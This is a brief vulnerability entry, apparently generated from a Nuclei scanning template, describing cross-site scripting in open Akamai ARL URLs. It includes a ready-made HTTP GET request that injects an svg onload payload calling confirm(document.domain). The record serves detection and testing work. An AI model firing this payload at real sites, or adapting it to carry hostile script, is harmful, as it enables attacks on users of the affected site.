# Vulnerability: Open Akamai ARL - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`akamai-arl-xss.yaml`)

## Description
Open Akamai ARL contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E
```

